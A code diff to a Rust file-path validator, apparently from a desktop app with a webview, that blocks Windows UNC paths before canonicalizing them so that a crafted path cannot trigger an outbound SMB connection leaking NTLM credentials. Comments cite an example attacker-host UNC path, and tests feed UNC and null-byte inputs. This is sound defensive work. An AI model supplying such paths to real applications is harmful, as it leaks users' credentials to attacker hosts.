@@ -18,26 +18,43 @@ pub fn validate_file_path(path: &str) -> Result<String, String> {
         return Err("Path contains null bytes".to_string());
     }
 
+    // Reject UNC / network paths on Windows BEFORE canonicalizing. `std::fs::canonicalize` opens a
+    // handle to the target to resolve it, so canonicalizing a `\\attacker.com\share\x.wav` handed in by
+    // the (untrusted) webview would ITSELF drive the SMB redirector — an outbound TCP/445 session that
+    // transmits the logged-in user's NTLM credentials to the attacker-controlled host — before any
+    // post-canonicalize prefix check could ever reject it (and canonicalize returns Err if the host is
+    // unreachable, so the guard never even runs, yet the creds are already on the wire). A SYNTACTIC
+    // prefix check on the RAW input needs zero filesystem/network I/O, so it blocks the leak at its
+    // source. Both `\\server\share` and `//server/share` parse to a UNC prefix on Windows.
+    #[cfg(windows)]
+    if is_unc_path(path) {
+        return Err("Network (UNC) paths are not allowed".to_string());
+    }
+
     // Canonicalize to resolve any `..` or symlinks
     let canonical = std::fs::canonicalize(path).map_err(|e| format!("Invalid path: {e}"))?;
 
-    // Reject UNC / network paths on Windows. `canonicalize` resolves a `\\server\share\...` path to a
-    // verbatim-UNC form, and any command that then reads it (get_waveform, get_audio_duration,
-    // transcribe_segment_*, ...) opens an OUTBOUND SMB connection to `server` — an attacker-controlled
-    // host via a crafted `\\attacker.com\share\x.wav` from the webview means an NTLM-relay /
-    // credential-leak. Block it at the shared validator so the whole path surface is covered at once.
-    // Local disk paths canonicalize to a Disk prefix (`\\?\C:\...`) and are unaffected.
+    // Defense-in-depth: also reject if canonicalization RESOLVED to a UNC path (e.g. a local symlink
+    // pointing at a network share). The syntactic pre-check above already blocks a directly-supplied
+    // UNC; this catches the indirect symlink case — which requires local filesystem access to plant —
+    // so a UNC path is never handed back to a caller that would then open it (a second SMB round-trip).
     #[cfg(windows)]
-    {
-        use std::path::{Component, Prefix};
-        if let Some(Component::Prefix(prefix)) = canonical.components().next() {
-            if matches!(prefix.kind(), Prefix::UNC(..) | Prefix::VerbatimUNC(..)) {
-                return Err("Network (UNC) paths are not allowed".to_string());
-            }
-        }
+    if is_unc_path(&canonical) {
+        return Err("Network (UNC) paths are not allowed".to_string());
     }
 
     Ok(canonical.to_string_lossy().to_string())
+}
+
+/// True if `p` begins with a Windows UNC / verbatim-UNC prefix (`\\server\share` or `\\?\UNC\...`).
+/// Purely syntactic — inspects the parsed prefix only, with no filesystem or network access.
+#[cfg(windows)]
+fn is_unc_path(p: &Path) -> bool {
+    use std::path::{Component, Prefix};
+    matches!(
+        p.components().next(),
+        Some(Component::Prefix(prefix)) if matches!(prefix.kind(), Prefix::UNC(..) | Prefix::VerbatimUNC(..))
+    )
 }
 
 /// Validate that a string is a safe identifier (alphanumeric + underscore + hyphen).
@@ -161,5 +178,21 @@ mod tests {
     fn test_validate_file_path_null_byte() {
         let result = validate_file_path("safe.txt\0malicious.exe");
         assert!(result.is_err());
+    }
+
+    #[cfg(windows)]
+    #[test]
+    fn validate_file_path_rejects_unc_syntactically_before_canonicalize() {
+        // A webview-supplied UNC path must be rejected by the SYNTACTIC prefix guard, BEFORE canonicalize
+        // opens a handle to it (which on Windows drives the SMB redirector -> outbound NTLM auth to the
+        // attacker host). We assert the error is the UNC rejection, not canonicalize's "Invalid path"
+        // (the old order), which is the observable proof the leaking canonicalize was never reached. The
+        // host uses the RFC-2606 `.invalid` TLD so that if the guard regressed, the fallback DNS lookup
+        // fails fast (NXDOMAIN) instead of hanging on an SMB timeout.
+        let err = validate_file_path(r"\\host.invalid\share\x.wav").expect_err("UNC must be rejected");
+        assert!(err.contains("UNC"), "must be rejected by the UNC guard, not canonicalize: {err}");
+        // The forward-slash form parses to a UNC prefix on Windows too.
+        let err2 = validate_file_path("//host.invalid/share/x.wav").expect_err("//UNC must be rejected");
+        assert!(err2.contains("UNC"), "forward-slash UNC must also be rejected: {err2}");
     }
 }
